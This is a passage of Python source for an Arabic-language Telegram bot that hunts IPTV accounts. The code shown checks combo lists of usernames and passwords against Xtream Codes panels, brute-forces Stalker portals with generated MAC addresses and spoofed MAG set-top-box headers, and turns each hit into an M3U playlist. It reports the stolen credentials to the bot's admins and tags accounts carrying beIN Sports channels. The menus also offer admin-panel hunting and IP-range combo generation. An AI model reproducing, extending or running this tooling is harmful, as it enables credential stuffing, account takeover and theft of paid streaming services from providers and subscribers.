                    st = _ST.get(uid)
                    if st:
                        srvs = [s.strip() for s in [st["server"]] + st["multi_servers"] if s.strip()]
                        if srvs and st["combo"] and not st["running"]:
                            try:
                                await app.bot.send_message(
                                    uid,
                                    f"⏰ <b>الصيد المجدول بدأ!</b>\n"
                                    f"🕐 الوقت: {scheduled_time.strftime('%H:%M')}\n"
                                    f"📋 {len(st['combo'])} كومبو",
                                    parse_mode=ParseMode.HTML
                                )
                            except Exception:
                                pass
        except asyncio.CancelledError:
            break
        except Exception as e:
            log.warning("Scheduler error: %s", e)


async def run_scheduled_jobs(app) -> None:
    """post_init callback — يُشغَّل بعد بناء التطبيق مباشرةً
    يرسل رسالة ترحيب لكل أدمن ثم يُنشئ مهمة الجدولة الخلفية"""
    now_str  = datetime.now().strftime("%Y-%m-%d  %H:%M:%S")
    py_ver   = sys.version.split()[0]
    welcome  = (
        f"╔{'═'*38}╗\n"
        f"║   🎯   {BOT_NAME}   {VERSION}   ║\n"
        f"║   ✅   البوت يعمل الآن بنجاح!          ║\n"
        f"╚{'═'*38}╝\n"
        f"\n"
        f"🟢  <b>تم التشغيل بنجاح</b>\n"
        f"🗓  {now_str}\n"
        f"🐍  Python {py_ver}\n"
        f"\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📡  MAC Portal + Xtream + Admin Hunter\n"
        f"🧠  Adaptive + Archive + Schedule\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"\n"
        f"💡 اضغط /start لفتح القائمة الرئيسية"
    )
    for uid in ADMIN_IDS:
        try:
            await app.bot.send_message(
                chat_id=uid,
                text=welcome,
                parse_mode=ParseMode.HTML,
            )
        except Exception as e:
            log.warning("Welcome msg failed for %s: %s", uid, e)
    # تشغيل حلقة الجدولة الخلفية
    asyncio.create_task(_scheduler_loop(app), name="scheduler")

# ════════════════════════════════════════════════════════════════
#  📡  Xtream Codes Engine المحسّن
# ════════════════════════════════════════════════════════════════
async def xtream_check(
    sess: aiohttp.ClientSession,
    host: str, user: str, pwd: str, timeout: int,
) -> Optional[dict]:
    url = f"{host.rstrip('/')}/player_api.php?username={user}&password={pwd}"
    try:
        async with sess.get(
            url,
            headers={"User-Agent": _next_ua()},
            timeout=aiohttp.ClientTimeout(total=timeout),
            ssl=False, allow_redirects=True,
        ) as r:
            if r.status != 200:
                return None
            text = await r.text(errors="replace")
            text = text.strip()
            if not text or text[0] not in ('{', '['):
                return None
            try:
                data = json.loads(text)
            except json.JSONDecodeError:
                return None
            if not isinstance(data, dict):
                return None
            ui = data.get("user_info", {})
            if not isinstance(ui, dict):
                return None
            auth = ui.get("auth")
            return data if (auth == 1 or str(auth) == "1") else None
    except asyncio.TimeoutError:
        return None
    except Exception:
        return None


async def xtream_fetch_content(
    sess: aiohttp.ClientSession,
    host: str, user: str, pwd: str, timeout: int,
) -> dict:
    base  = f"{host.rstrip('/')}/player_api.php?username={user}&password={pwd}"
    to12  = aiohttp.ClientTimeout(total=min(timeout, 12))
    to8   = aiohttp.ClientTimeout(total=min(timeout, 8))
    hdrs  = {"User-Agent": _next_ua()}
    result = {
        "live_count": 0, "vod_count": 0, "series_count": 0,
        "has_bein": False, "bein_chs": [], "m3u_lines": [],
        # Arabic detection v23
        "has_arabic": False, "arabic_info": {},
    }
    # قنوات Live
    try:
        async with sess.get(f"{base}&action=get_live_streams", timeout=to12, ssl=False, headers=hdrs) as r:
            if r.status == 200:
                streams = json.loads(await r.text(errors="replace"))
                if isinstance(streams, list):
                    result["live_count"] = len(streams)
                    bein = _find_bein_channels(streams)
                    if bein:
                        result["has_bein"] = True
                        result["bein_chs"] = bein
                    # ── كشف القنوات العربية ──────────────────
                    ar_info = _count_arabic_channels(streams)
                    result["arabic_info"] = ar_info
                    result["has_arabic"]  = ar_info["total_arabic"] > 0
                    # ─────────────────────────────────────────
                    h   = host.rstrip("/")
                    m3u = ["#EXTM3U"]
                    for ch in streams:
                        name = str(ch.get("name",""))
                        sid  = ch.get("stream_id","")
                        cat  = str(ch.get("category_name",""))
                        logo = ch.get("stream_icon","")
                        epg  = ch.get("epg_channel_id","")
                        ext  = ch.get("container_extension","ts")
                        m3u.append(f'#EXTINF:-1 tvg-id="{epg}" tvg-name="{name}" tvg-logo="{logo}" group-title="{cat}",{name}')
                        m3u.append(f"{h}/live/{user}/{pwd}/{sid}.{ext}")
                    result["m3u_lines"] = m3u
    except Exception:
        pass
    # VOD
    try:
        async with sess.get(f"{base}&action=get_vod_streams", timeout=to8, ssl=False, headers=hdrs) as r:
            if r.status == 200:
                vods = json.loads(await r.text(errors="replace"))
                if isinstance(vods, list):
                    result["vod_count"] = len(vods)
    except Exception:
        pass
    # Series
    try:
        async with sess.get(f"{base}&action=get_series", timeout=to8, ssl=False, headers=hdrs) as r:
            if r.status == 200:
                ser = json.loads(await r.text(errors="replace"))
                if isinstance(ser, list):
                    result["series_count"] = len(ser)
    except Exception:
        pass
    return result

# ════════════════════════════════════════════════════════════════
#  📡  MAC / STB Engine
# ════════════════════════════════════════════════════════════════
MAC_OUI_LIST = [
    "00:1A:79","00:26:91","18:B9:05","00:D0:E0","B4:A2:EB",
    "00:15:99","2C:FD:A1","00:1A:3F","E4:17:D8","A4:C3:F0",
]
MAC_OUI_DEFAULT = "00:1A:79"

_PORTAL_PATHS = ["/c/", "/portal.php", "/c/index.html", "/stalker_portal/c/"]

_STB_UA = [
    "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 1812 Mobile Safari/533.3",
    "Mozilla/5.0 (SMART-TV; Linux; Tizen 5.0) AppleWebKit/538.1 (KHTML, like Gecko) Version/5.0 TV Safari/538.1",
    "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG322 stbapp ver: 4 rev: 2700 Mobile Safari/533.3",
    "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG520 stbapp ver: 4 rev: 3260 Mobile Safari/533.3",
]
_STB_MODELS  = ["MAG200","MAG250","MAG254","MAG256","MAG322","MAG324","MAG420","MAG520"]
_TIMEZONES   = ["Europe/Kiev","Europe/London","America/New_York","Europe/Paris","Asia/Dubai","Africa/Cairo"]


def mac_generate(index: Optional[int] = None, oui: Optional[str] = None) -> str:
    p = oui or random.choice(MAC_OUI_LIST)
    if index is not None:
        return f"{p}:{(index>>16)&0xFF:02X}:{(index>>8)&0xFF:02X}:{index&0xFF:02X}"
    t = [random.randint(0, 255) for _ in range(3)]
    return f"{p}:{t[0]:02X}:{t[1]:02X}:{t[2]:02X}"


def mac_seq_range(start: int, count: int, oui: Optional[str] = None) -> list:
    p = oui or MAC_OUI_DEFAULT
    return [mac_generate(start + i, p) for i in range(count)]


def _stb_headers(mac: str, referer: str = "") -> dict:
    return {
        "User-Agent":      random.choice(_STB_UA),
        "Accept":          "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "en-US,en;q=0.9,ar;q=0.8",
        "Accept-Encoding": "gzip, deflate",
        "X-User-Agent":    f"Model: {random.choice(_STB_MODELS)}; Link: WiFi",
        "Cookie":          f"mac={mac}; stb_lang=en; timezone={random.choice(_TIMEZONES)}",
        "Referer":         referer,
        "Connection":      "keep-alive",
    }


async def _stb_handshake(sess, portal: str, mac: str, timeout: int) -> tuple[bool, str, str]:
    for path in _PORTAL_PATHS:
        url = f"{portal.rstrip('/')}{path}"
        try:
            async with sess.get(
                url,
                params={"action":"handshake","type":"stb","token":"","JsHttpRequest":"1-xml"},
                headers=_stb_headers(mac, url),
                timeout=aiohttp.ClientTimeout(total=timeout),
                ssl=False, allow_redirects=True,
            ) as r:
                if r.status not in (200, 302):
                    continue
                raw = await r.text(errors="replace")
                raw = raw.strip()
                if not raw.startswith("{"):
                    continue
                js_data = json.loads(raw).get("js", {})
                if not isinstance(js_data, dict):
                    continue
                token = js_data.get("token","")
                if token and len(token) > 4:
                    return True, token, path
        except Exception:
            continue
    return False, "", ""


async def mac_portal_check(
    sess, portal: str, mac: str, timeout: int, verify: bool = True
) -> Optional[dict]:
    ok, token, wpath = await _stb_handshake(sess, portal, mac, timeout)
    if not ok:
        return None
    base_url = f"{portal.rstrip('/')}{wpath}"
    try:
        async with sess.get(
            base_url,
            params={"action":"get_profile","type":"stb","token":token,"JsHttpRequest":"1-xml"},
            headers={**_stb_headers(mac, base_url), "Authorization": f"Bearer {token}"},
            timeout=aiohttp.ClientTimeout(total=min(timeout, 8)),
            ssl=False,
        ) as r:
            if r.status != 200:
                return None
            raw = await r.text(errors="replace")
            if not raw.strip().startswith("{"):
                return None
            profile = json.loads(raw).get("js", {})
            if not isinstance(profile, dict):
                return None
    except Exception:
        return None

    try:
        async with sess.get(
            base_url,
            params={"action":"get_account_info","type":"stb","token":token,"JsHttpRequest":"1-xml"},
            headers={**_stb_headers(mac, base_url), "Authorization": f"Bearer {token}"},
            timeout=aiohttp.ClientTimeout(total=min(timeout, 8)),
            ssl=False,
        ) as r:
            raw = await r.text(errors="replace")
            acct = json.loads(raw).get("js", {}) if raw.strip().startswith("{") else {}
    except Exception:
        acct = {}

    return {"token": token, "wpath": wpath, "profile": profile, "acct": acct}


async def mac_fetch_channels(
    sess, portal: str, mac: str, token: str, timeout: int, wpath: str
) -> dict:
    result = {"live_count": 0, "vod_count": 0, "has_bein": False, "bein_chs": [], "m3u_lines": [],
              "has_arabic": False, "arabic_info": {}}
    base_url = f"{portal.rstrip('/')}{wpath}"
    all_ch = []
    page = 1
    while page <= 20:
        try:
            hdrs = {**_stb_headers(mac, base_url), "Authorization": f"Bearer {token}"}
            async with sess.get(
                base_url,
                params={"action":"get_ordered_list","type":"itv","token":token,
                        "JsHttpRequest":"1-xml","p":str(page),"items_num":"500",
                        "genre":"*","force_ch_link_check":"","fav":"0","sortby":"number"},
                headers=hdrs,
                timeout=aiohttp.ClientTimeout(total=min(timeout, 10)),
                ssl=False,
            ) as r:
                if r.status != 200:
                    break
                raw = await r.text(errors="replace")
                if not raw.strip().startswith("{"):
                    break
                js = json.loads(raw).get("js", {})
                if not isinstance(js, dict):
                    break
                data_list = js.get("data", [])
                if not data_list:
                    break
                all_ch.extend(data_list)
                total_items = int(js.get("total_items", len(all_ch)))
                if len(all_ch) >= total_items:
                    break
                page += 1
        except Exception:
            break

    if all_ch:
        bein = _find_bein_channels(all_ch)
        if bein:
            result["has_bein"] = True
            result["bein_chs"] = bein
        # ── كشف القنوات العربية (MAC) ─────────────────────
        ar_info = _count_arabic_channels(all_ch)
        result["arabic_info"] = ar_info
        result["has_arabic"]  = ar_info["total_arabic"] > 0
        # ──────────────────────────────────────────────────
        m3u = ["#EXTM3U"]
        h = portal.rstrip("/")
        for ch in all_ch:
            name = str(ch.get("name",""))
            cmd  = str(ch.get("cmd",""))
            if "localhost" in cmd:
                cmd_parts = cmd.split("/")
                sid = cmd_parts[-1] if cmd_parts else ""
                stream_url = f"{h}/play/{sid}?mac={mac}&token={token}&type=m3u"
            else:
                stream_url = cmd
            logo = ch.get("logo","")
            genre = ch.get("genre_title","")
            m3u.append(f'#EXTINF:-1 tvg-name="{name}" tvg-logo="{logo}" group-title="{genre}",{name}')
            m3u.append(stream_url)
    else:
        m3u = []

    result["live_count"] = len(all_ch)
    result["m3u_lines"]  = m3u

    try:
        hdrs = {**_stb_headers(mac, base_url), "Authorization": f"Bearer {token}"}
        async with sess.get(
            base_url,
            params={"action":"get_ordered_list","type":"vod","token":token,
                    "JsHttpRequest":"1-xml","p":"1","items_num":"1"},
            headers=hdrs,
            timeout=aiohttp.ClientTimeout(total=min(timeout, 6)),
            ssl=False,
        ) as r:
            if r.status == 200:
                raw = await r.text(errors="replace")
                if raw.strip().startswith("{"):
                    js = json.loads(raw).get("js", {})
                    if isinstance(js, dict):
                        result["vod_count"] = int(js.get("total_items", 0))
    except Exception:
        pass
    return result

# ════════════════════════════════════════════════════════════════
#  🗃️  بناء كائنات الحسابات
# ════════════════════════════════════════════════════════════════
def _parse_expiry(raw) -> tuple[str, bool]:
    s = str(raw or "").strip()
    if not s or s in ("0","0000-00-00","0000-00-00 00:00:00","null","None"):
        return "♾️ غير محدود", True
    if s.isdigit():
        try:
            ts = int(s)
            if ts > 0:
                dt = datetime.fromtimestamp(ts)
                return dt.strftime("%Y-%m-%d"), dt > datetime.now()
        except (ValueError, OSError, OverflowError):
            pass
    for fmt in ("%Y-%m-%d %H:%M:%S","%Y-%m-%d","%d.%m.%Y","%d/%m/%Y","%m/%d/%Y"):
        try:
            dt = datetime.strptime(s, fmt)
            return dt.strftime("%Y-%m-%d"), dt > datetime.now()
        except ValueError:
            continue
    return s[:20], True


def mk_xtream(host: str, user: str, pwd: str, data: dict) -> dict:
    ui       = data.get("user_info", {})
    exp, act = _parse_expiry(ui.get("exp_date") or ui.get("expiration"))
    status   = str(ui.get("status","")).lower()
    if status in ("banned","disabled","expired"):
        act = False
    is_unlimited = (
        not ui.get("exp_date") or
        ui.get("exp_date") in ("0","null","None","") or
        "♾️" in exp
    )
    return {
        "kind": "xtream", "host": host, "user": user, "pass": pwd,
        "exp": exp, "is_active": act, "status": status,
        "max_conn": ui.get("max_connections","?"),
        "active_conn": ui.get("active_cons", 0),
        "found": datetime.now().strftime("%H:%M:%S"),
        "xtream_line": f"{host}|{user}|{pwd}",
        "m3u_url": f"{host}/get.php?username={user}&password={pwd}&type=m3u_plus&output=ts",
        "live_count": 0, "vod_count": 0, "series_count": 0,
        "has_bein": False, "bein_chs": [], "m3u_lines": [],
        "has_arabic": False, "arabic_info": {},
        "is_unlimited": is_unlimited,
        "is_trial": False, "trial_reason": [],
        "is_reseller": False, "can_create": False,
        "is_abandoned": False, "abandoned_indicators": [],
        "admin_found": False, "admin_url": "", "admin_open": False,
    }


def mk_mac(portal: str, mac: str, data: dict) -> dict:
    p        = data["profile"]
    a        = data["acct"]
    raw_exp  = (p.get("end_date") or a.get("end_date") or
                p.get("expire_billing_date") or a.get("expire_billing_date") or "")
    exp, act = _parse_expiry(raw_exp)
    plan     = p.get("tariff_plan_name") or a.get("plan_name") or "—"
    max_c    = p.get("max_connections") or a.get("max_connections") or "—"
    tok, wp  = data["token"], data["wpath"]
    is_unlimited = not raw_exp or raw_exp in ("0","null","None","")
    return {
        "kind": "mac", "portal": portal, "mac": mac,
        "token": tok, "wpath": wp, "exp": exp, "is_active": act,
        "plan": plan, "max_conn": max_c, "ch_cnt": data.get("ch_cnt",0),
        "found": datetime.now().strftime("%H:%M:%S"),
        "m3u_url": f"{portal.rstrip('/')}{wp}?action=get_all_channels&type=itv&token={tok}&JsHttpRequest=1-xml",
        "live_count": 0, "vod_count": 0, "has_bein": False, "bein_chs": [], "m3u_lines": [],
        "has_arabic": False, "arabic_info": {},
        "is_unlimited": is_unlimited,
    }

# ════════════════════════════════════════════════════════════════
#  🎨  رسائل النتائج — تصميم احترافي
# ════════════════════════════════════════════════════════════════
def _fmt_num(n: int) -> str:
    if n >= 1_000_000: return f"{n/1e6:.1f}M"
    if n >= 1_000:     return f"{n/1e3:.1f}K"
    return str(n)

def _fmt_time(sec: float) -> str:
    s = int(sec)
    h, r = divmod(s, 3600)
    m, s = divmod(r, 60)
    return (f"{h}h " if h else "") + (f"{m}m " if m else "") + f"{s}s"

def _pbar(done: int, total: int, w: int = 16) -> str:
    if total <= 0: return "░" * w
    f = int(min(done / total, 1.0) * w)
    return "▓" * f + "░" * (w - f)

def _speed(log_: list) -> float:
    now = time.monotonic()
    log_[:] = [(ts, c) for ts, c in log_ if now - ts <= 5]
    if len(log_) < 2:
        return 0.0
    dt = log_[-1][0] - log_[0][0]
    dc = log_[-1][1] - log_[0][1]
    return dc / dt if dt > 0 else 0.0

def _bein_badge(has: bool, chs: list) -> str:
    if not has:
        return "⚽  beIN Sports  ✖️"
    names = " · ".join(chs[:4]) + ("…" if len(chs) > 4 else "")
    return f"⚽  <b>beIN Sports  ✅  ({len(chs)} قناة)</b>\n     ╰ {names}"

def _content_badge(live: int, vod: int, series: int = 0) -> str:
    parts = []
    if live:   parts.append(f"📺 <b>{_fmt_num(live)}</b> قناة")
    if vod:    parts.append(f"🎬 <b>{_fmt_num(vod)}</b> فيلم")
    if series: parts.append(f"🎞 <b>{_fmt_num(series)}</b> مسلسل")
    return "  ·  ".join(parts) if parts else "—"

def _badges(acc: dict) -> str:
    """شارات خاصة للحسابات المميزة"""
    badges = []
    if acc.get("is_unlimited"):
        badges.append("♾️ <b>UNLIMITED</b>")
    if acc.get("is_trial"):
        badges.append("🧪 <b>TRIAL</b>")
    if acc.get("is_reseller"):
        badges.append("👑 <b>RESELLER</b>")
    if acc.get("can_create"):
        badges.append("➕ <b>CAN CREATE</b>")
    if acc.get("admin_found"):
        open_tag = " 🔓 OPEN" if acc.get("admin_open") else ""
        badges.append(f"🛡️ <b>ADMIN{open_tag}</b>")
    if acc.get("is_abandoned"):
        badges.append("🗑️ <b>ABANDONED</b>")
    return "  ".join(badges) if badges else ""


def hit_xtream(acc: dict) -> str:
    st_ic    = "🟢 <b>نشط</b>" if acc["is_active"] else "🔴 <b>منتهي</b>"
    host_s   = acc["host"].replace("http://","").replace("https://","")[:44]
    bdgs     = _badges(acc)
    bdg_line = f"\n🏷️  {bdgs}" if bdgs else ""
    ar_info  = acc.get("arabic_info", {})
    ar_badge = _arabic_badge(ar_info)
    pkg_badge= _arabic_pkg_badge(ar_info)
    ar_list  = "  🌙 <b>قائمة عربية</b>" if ar_info.get("has_arabic_list") else ""
    return (
        f"╔{'═'*36}╗\n"
        f"║  🎯  {BOT_NAME}  ·  XTREAM HIT  {VERSION}\n"
        f"╚{'═'*36}╝\n"
        f"\n"
        f"🖥  <code>{host_s}</code>\n"
        f"👤  <b>{acc['user']}</b>   🔑  <b>{acc['pass']}</b>\n"
        f"{bdg_line}\n"
        f"{_LINE_MID}\n"
        f"  {st_ic}   📅 {acc['exp']}   👥 {acc['active_conn']}/{acc['max_conn']}\n"
        f"{_LINE_MID}\n"
        f"\n"
        f"  {_content_badge(acc['live_count'], acc['vod_count'], acc['series_count'])}{ar_list}\n"
        f"  {_bein_badge(acc['has_bein'], acc['bein_chs'])}\n"
        f"  {ar_badge}\n"
        f"  {pkg_badge}\n"
        f"\n"
        f"{_LINE_MID}\n"
        f"🔗  <code>{acc['xtream_line']}</code>\n"
        f"📲  <a href='{acc['m3u_url']}'>M3U رابط مباشر</a>\n"
        f"{_LINE_MID}\n"
        f"🕐  {acc['found']}   ·   <i>{BOT_NAME} {VERSION}</i>"
    )


def hit_mac(acc: dict) -> str:
    st_ic  = "🟢 <b>نشط</b>" if acc["is_active"] else "🔴 <b>منتهي</b>"
    portal = acc["portal"].replace("http://","").replace("https://","")[:44]
    bdgs   = _badges(acc)
    bdg_line = f"\n🏷️  {bdgs}" if bdgs else ""
    ar_info  = acc.get("arabic_info", {})
    ar_badge = _arabic_badge(ar_info)
    pkg_badge= _arabic_pkg_badge(ar_info)
    ar_list  = "  🌙 <b>قائمة عربية</b>" if ar_info.get("has_arabic_list") else ""
    return (
        f"╔{'═'*36}╗\n"
        f"║  📡  {BOT_NAME}  ·  MAC HIT  {VERSION}\n"
        f"╚{'═'*36}╝\n"
        f"\n"
        f"🌐  <code>{portal}</code>\n"
        f"📟  <code>{acc['mac']}</code>\n"
        f"{bdg_line}\n"
        f"{_LINE_MID}\n"
        f"  {st_ic}   📅 {acc['exp']}   📋 {acc['plan']}\n"
        f"{_LINE_MID}\n"
        f"\n"
        f"  {_content_badge(acc['live_count'], acc['vod_count'])}{ar_list}\n"
        f"  {_bein_badge(acc['has_bein'], acc['bein_chs'])}\n"
        f"  {ar_badge}\n"
        f"  {pkg_badge}\n"
        f"\n"
        f"{_LINE_MID}\n"
        f"🕐  {acc['found']}   ·   <i>{BOT_NAME} {VERSION}</i>"
    )

# ════════════════════════════════════════════════════════════════
#  📮  إرسال / تعديل آمن
# ════════════════════════════════════════════════════════════════
_HTML = {"parse_mode": ParseMode.HTML, "disable_web_page_preview": True}

async def safe_send(bot, cid: int, text: str, markup=None) -> bool:
    kw = dict(_HTML)
    if markup:
        kw["reply_markup"] = markup
    for attempt in range(3):
        try:
            await bot.send_message(chat_id=cid, text=text, **kw)
            return True
        except RetryAfter as e:
            await asyncio.sleep(min(e.retry_after + 1, 30))
        except BadRequest as e:
            log.warning("safe_send BadRequest: %s", e)
            return False
        except Exception as e:
            if attempt == 2:
                log.warning("safe_send failed: %s", e)
            await asyncio.sleep(1)
    return False

async def safe_edit(msg, text: str, markup=None) -> bool:
    kw = {"parse_mode": ParseMode.HTML, "disable_web_page_preview": True}
    if markup:
        kw["reply_markup"] = markup
    for attempt in range(3):
        try:
            await msg.edit_text(text, **kw)
            return True
        except RetryAfter as e:
            await asyncio.sleep(min(e.retry_after + 1, 30))
        except BadRequest:
            return False
        except Exception:
            if attempt < 2:
                await asyncio.sleep(0.8)
    return False

# ════════════════════════════════════════════════════════════════
#  🌐  فحص الاتصال
# ════════════════════════════════════════════════════════════════
async def ping_host(host: str, timeout: int = 6) -> tuple[bool, int]:
    url = f"{host.rstrip('/')}/player_api.php?username=x&password=x"
    t0  = time.time()
    try:
        async with aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(ssl=False, limit=1)
        ) as s:
            async with s.get(url, timeout=aiohttp.ClientTimeout(total=timeout)) as r:
                ms   = int((time.time()-t0)*1000)
                body = await r.text(errors="replace")
                return r.status in (200,401,403) or "server_info" in body, ms
    except Exception:
        return False, 0


async def ping_portal(portal: str, timeout: int = 8) -> dict:
    portal = portal.rstrip("/")
    res    = {"online": False, "ms": 0, "stalker": False, "info": ""}
    t0     = time.time()
    try:
        async with aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(ssl=False, limit=3)
        ) as s:
            try:
                async with s.get(portal, timeout=aiohttp.ClientTimeout(total=5), ssl=False) as r:
                    res["ms"]     = int((time.time()-t0)*1000)
                    res["online"] = r.status < 500
                    res["info"]   = f"HTTP {r.status}"
            except Exception:
                res["info"] = "لا يستجيب"; return res
            for path in _PORTAL_PATHS[:3]:
                url = f"{portal}{path}"
                try:
                    async with s.get(
                        url,
                        params={"action":"handshake","type":"stb","token":"","JsHttpRequest":"1-xml"},
                        headers=_stb_headers("00:1A:79:00:00:01", url),
                        timeout=aiohttp.ClientTimeout(total=6), ssl=False,
                    ) as r2:
                        if r2.status == 200:
                            raw = await r2.text(errors="replace")
                            if raw.strip().startswith("{"):
                                tok = (json.loads(raw).get("js") or {}).get("token","")
                                if tok and len(tok) > 4:
                                    res["stalker"] = True; break
                except Exception:
                    continue
    except Exception:
        pass
    return res

# ════════════════════════════════════════════════════════════════
#  📋  Combo Parser
# ════════════════════════════════════════════════════════════════
def parse_line(ln: str) -> Optional[tuple[str,str,str]]:
    ln = ln.strip()
    if not ln or ln.startswith("#"): return None
    if "|" in ln:
        parts = ln.split("|")
        if len(parts) == 3:
            h, u, p = (x.strip() for x in parts)
            return ("http://"+h if h and not h.startswith("http") else h), u, p
        if len(parts) == 2:
            return "", parts[0].strip(), parts[1].strip()
    if ":" in ln:
        i = ln.index(":")
        u, p = ln[:i].strip(), ln[i+1:].strip()
        if u and p: return "", u, p
    return None

def load_combo(text: str) -> tuple[list, int, int]:
    out, seen, dupes = [], set(), 0
    for ln in text.splitlines():
        r = parse_line(ln)
        if not r: continue
        k = f"{r[1]}:{r[2]}"
        if k in seen: dupes += 1
        else: seen.add(k); out.append(r)
    return out, len(text.splitlines()), dupes

# ════════════════════════════════════════════════════════════════
#  🗂️  حالة المستخدمين
# ════════════════════════════════════════════════════════════════
_ST: dict[int, dict] = {}

def S(uid: int) -> dict:
    if uid not in _ST:
        _ST[uid] = {
            # Xtream
            "server": "", "multi_servers": [], "threads": 40,
            "timeout": 8, "retry": 1, "combo": [],
            "results": [], "checked": 0, "valid": 0,
            "running": False, "stop_flag": False, "paused": False,
            "loop_mode": False, "loop_round": 0,
            "active_only": False, "tg_auto": True,
            # MAC
            "mac_results": [], "mac_sess_idx": 0,
            "mac_running": False, "mac_checked": 0, "mac_hits": 0,
            "mac_portal": "", "mac_portals": [],
            "mac_mode": "random", "mac_seq_start": 0,
            "mac_count": 5000, "mac_threads": 25,
            "mac_oui": MAC_OUI_DEFAULT, "mac_multi_oui": False,
            "mac_active_only": True, "mac_verify": True,
            # مشترك
            "speed_log": [], "peak_spd": 0.0,
            "sess_start": time.time(), "health": {},
            # جديد v22
            "archive": {"results": [], "mac_results": []},
            "detect_admin": False,
            "detect_reseller": False,
            "detect_trial": False,
            "detect_abandoned": False,
            "adaptive_mode": True,
            "ua_rotation": True,
            "srv_stats": defaultdict(lambda: {"hits":0,"checked":0}),
            "schedule": None,
            "pause_queue": None,
            "pause_done": 0,
        }
    return _ST[uid]

# ════════════════════════════════════════════════════════════════
#  🛡️  حماية الأدمن
# ════════════════════════════════════════════════════════════════
def admin_only(fn):
    @wraps(fn)
    async def _w(upd: Update, ctx: ContextTypes.DEFAULT_TYPE):
        if upd.effective_user.id not in ADMIN_IDS:
            await upd.message.reply_text(
                "╔══════════════════╗\n║  ⛔  وصول مرفوض  ║\n╚══════════════════╝",
                parse_mode=ParseMode.HTML
            )
            return
        return await fn(upd, ctx)
    return _w

def admin_cb(fn):
    @wraps(fn)
    async def _w(upd: Update, ctx: ContextTypes.DEFAULT_TYPE):
        if upd.effective_user.id not in ADMIN_IDS:
            await upd.callback_query.answer("⛔ وصول مرفوض", show_alert=True); return
        return await fn(upd, ctx)
    return _w

# ════════════════════════════════════════════════════════════════
#  ⌨️  لوحات المفاتيح
# ════════════════════════════════════════════════════════════════
def kb_main() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⚡ صيد Xtream",         callback_data="hunt:menu"),
         InlineKeyboardButton("🎯 النتائج",             callback_data="res:menu")],
        [InlineKeyboardButton("📡 MAC Portal Hunter",   callback_data="mac:menu"),
         InlineKeyboardButton("📋 إدارة الكومبو",       callback_data="combo:menu")],
        [InlineKeyboardButton("🔍 فحص حساب",           callback_data="single:go"),
         InlineKeyboardButton("⚡ مولّد كومبو",         callback_data="gen:menu")],
        [InlineKeyboardButton("🌐 استخراج سيرفرات",    callback_data="srv:fetch"),
         InlineKeyboardButton("🔢 كومبو IP Range",     callback_data="gen:iprange")],
        [InlineKeyboardButton("🏥 مراقبة السيرفرات",   callback_data="hlth:menu"),
         InlineKeyboardButton("📊 إحصائيات مباشرة",    callback_data="stat:show")],
        [InlineKeyboardButton("🧠 صيد تكيفي",          callback_data="adapt:menu"),
         InlineKeyboardButton("📦 الأرشيف",            callback_data="arch:menu")],
        [InlineKeyboardButton("🛡️ Admin Hunter",       callback_data="adm:menu"),
         InlineKeyboardButton("🕐 جدولة الصيد",        callback_data="sched:menu")],
        [InlineKeyboardButton("⚙️ الإعدادات",           callback_data="cfg:menu"),
         InlineKeyboardButton("❓ دليل الاستخدام",     callback_data="help:show")],
    ])

def _bk(d="main") -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع للخلف", callback_data=f"nav:{d}")]])

def _bkr(d="main") -> list:
    return [InlineKeyboardButton("🔙 رجوع للخلف", callback_data=f"nav:{d}")]

# ════════════════════════════════════════════════════════════════
#  🏠  /start  — الشاشة الرئيسية
# ════════════════════════════════════════════════════════════════
@admin_only
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid   = update.effective_user.id
    st    = S(uid)
    name  = update.effective_user.first_name or "صياد"
    total = len(st["results"]) + len(st["mac_results"])
    act   = sum(1 for r in st["results"] if r["is_active"])
    bein  = sum(1 for r in st["results"] + st["mac_results"] if r["has_bein"])
    unlim = sum(1 for r in st["results"] if r.get("is_unlimited"))
    arab  = sum(1 for r in st["results"] + st["mac_results"] if r.get("has_arabic"))
    stat  = "🟢 <b>نشط</b>" if (st["running"] or st["mac_running"]) else ("⏸ مؤقف" if st["paused"] else "⚫ جاهز")
    ela   = int(time.time() - st["sess_start"])
    ela_s = _fmt_time(ela)
    now   = datetime.now().strftime("%Y-%m-%d  %H:%M:%S")
    arch_total = len(st["archive"]["results"]) + len(st["archive"]["mac_results"])
    await update.message.reply_text(
        f"╔{'═'*38}╗\n"
        f"║   🎯   {BOT_NAME}   {VERSION}   ║\n"
        f"║   صائد IPTV احترافي متكامل          ║\n"
        f"╚{'═'*38}╝\n"
        f"\n"
        f"👋  مرحباً  <b>{name}</b>   —   {stat}\n"
        f"🗓  {now}\n"
        f"\n"
        f"{_LINE_MID}\n"
        f"🏆  إصابات:      <b>{total}</b>   ·   📦 مؤرشف: <b>{arch_total}</b>\n"
        f"✅  نشطة:        <b>{act}</b>     ·   🔴 منتهية: <b>{total-act}</b>\n"
        f"♾️  Unlimited:   <b>{unlim}</b>\n"
        f"⚽  beIN Sports:  <b>{bein}</b>\n"
        f"🌙  عربي:         <b>{arab}</b>\n"
        f"📡  MAC Hits:     <b>{st['mac_hits']}</b>\n"
        f"📋  الكومبو:      <b>{_fmt_num(len(st['combo']))}</b>  سطر\n"
        f"⏱  وقت الجلسة:  <b>{ela_s}</b>\n"
        f"{_LINE_MID}\n"
        f"\n"
        f"  اختر من القائمة 👇",
        parse_mode=ParseMode.HTML,
        reply_markup=kb_main(),
        disable_web_page_preview=True,
    )

# ════════════════════════════════════════════════════════════════
#  🔀  موزّع Callbacks
# ════════════════════════════════════════════════════════════════
@admin_cb
async def on_cb(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q   = update.callback_query
    await q.answer()
    uid = q.from_user.id
    st  = S(uid)
    pre, _, pay = q.data.partition(":")
    try:
        match pre:
            case "nav":    await _nav(q, pay, st)
